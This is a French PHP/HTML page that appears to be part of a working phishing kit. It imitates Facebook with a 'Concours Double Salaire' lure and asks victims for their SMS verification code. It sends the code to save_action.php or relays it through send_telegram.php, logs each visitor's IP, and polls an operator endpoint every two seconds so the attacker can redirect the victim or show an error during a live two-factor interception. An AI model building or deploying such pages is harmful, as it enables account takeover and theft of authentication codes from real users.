<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';
$smsCode = ''; // Initialiser la variable pour éviter une erreur

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Vérifier s'il y a une action en cours
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'sms_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'Le code SMS que vous avez entré est incorrect. Veuillez réessayer.';
        // Supprimer l'action pour ne pas afficher l'erreur en boucle
        unlink($actionFile);
    }
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'sms_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Variable pour le code SMS attendu (peut être défini ailleurs dans votre système)
$expectedSmsCode = '';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification SMS</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            max-width: 60px;
            margin-bottom: 15px;
        }
        
        .sms-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .sms-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #9c27b0;
            text-align: center;
        }
        
        .sms-message {
            color: #65676b;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            color: #65676b;
            margin-bottom: 5px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            text-align: center;
            letter-spacing: 5px;
            font-weight: bold;
        }
        
        .form-control:focus {
            border-color: #9c27b0;
            outline: none;
            box-shadow: 0 0 0 2px #f3e5f5;
        }
        
        .verify-button {
            width: 100%;
            padding: 12px 0;
            background-color: #9c27b0;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .verify-button:hover {
            background-color: #7b1fa2;
        }
        
        .resend-link {
            text-align: center;
            margin-bottom: 15px;
        }
        
        .resend-link a {
            color: #9c27b0;
            text-decoration: none;
            font-size: 14px;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .timer {
            text-align: center;
            margin-bottom: 15px;
            color: #65676b;
            font-size: 14px;
        }
        
        .timer span {
            font-weight: bold;
            color: #9c27b0;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png" alt="Logo" class="logo">
        </div>
        
        <div class="sms-card">
            <div class="sms-title">Vérification par SMS</div>
            <p class="sms-message">Pour des raisons de sécurité, veuillez entrer le code à 6-8 chiffres que nous avons envoyé par SMS au numéro associé à votre compte.</p>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>

            <form id="sms-form" method="post" action="loading.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>">
                <div class="form-group">
                    <label for="sms-code" class="form-label">Code SMS</label>
                    <input type="text" id="sms-code" name="sms_code" class="form-control" placeholder="------" maxlength="8" pattern="[0-9]*" inputmode="numeric" required value="<?php echo htmlspecialchars($smsCode); ?>">
                </div>
                
                <div class="timer">
                    Temps restant: <span id="countdown">02:00</span>
                </div>
                
                <button type="submit" class="verify-button">
                    Vérifier
                </button>
                
                <div class="resend-link">
                    <a href="#" id="resend-link" style="display: none;">Renvoyer le code</a>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            const expectedSmsCode = '<?php echo $expectedSmsCode; ?>';
            const smsForm = document.getElementById('sms-form');
            const smsCodeInput = document.getElementById('sms-code');
            const resendLink = document.getElementById('resend-link');
            const countdownElement = document.getElementById('countdown');
            
            // Mettre le focus sur le champ de code SMS
            smsCodeInput.focus();
            
            // Gérer la soumission du formulaire
            smsForm.addEventListener('submit', function(event) {
                event.preventDefault();
                
                const smsCode = smsCodeInput.value.trim();
                
                if (smsCode === '') {
                    return;
                }
                
                // Méthode 1: Envoyer le code SMS au serveur via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'sms_code_submitted',
                        smsCode: smsCode
                    })
                })
                .then(response => response.json())
                .then(data => {
                    // Rediriger vers la page de chargement
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Méthode 2: Essayer d'envoyer via send_telegram.php comme solution de secours
                    fetch('send_telegram.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔔 CODE SMS REÇU 🔔\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}\n📱 Code SMS: ${smsCode}`
                        })
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.error('Erreur send_telegram:', error);
                    })
                    .finally(() => {
                        // Rediriger quand même en cas d'erreur
                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                    });
                });
            });
            
            // Gérer le compte à rebours
            let timeLeft = 120; // 2 minutes en secondes
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendLink.style.display = 'inline';
                } else {
                    timeLeft--;
                }
            }
            
            // Mettre à jour le compte à rebours toutes les secondes
            updateCountdown();
            const countdownInterval = setInterval(updateCountdown, 1000);
            
            // Gérer le renvoi du code
            resendLink.addEventListener('click', function(event) {
                event.preventDefault();
                
                // Réinitialiser le compte à rebours
                timeLeft = 120;
                updateCountdown();
                resendLink.style.display = 'none';
                
                // Redémarrer l'intervalle
                clearInterval(countdownInterval);
                const newCountdownInterval = setInterval(updateCountdown, 1000);
                
                // Méthode 1: Envoyer une notification au serveur via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'sms_resend_requested'
                    })
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Méthode 2: Essayer d'envoyer via send_telegram.php comme solution de secours
                    fetch('send_telegram.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔄 DEMANDE DE RENVOI DE CODE SMS 🔄\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}`
                        })
                    })
                    .catch(error => {
                        console.error('Erreur send_telegram:', error);
                    });
                });
            });
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'sms_error') {
                            // Recharger la page pour afficher le message d'erreur
                            window.location.reload();
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>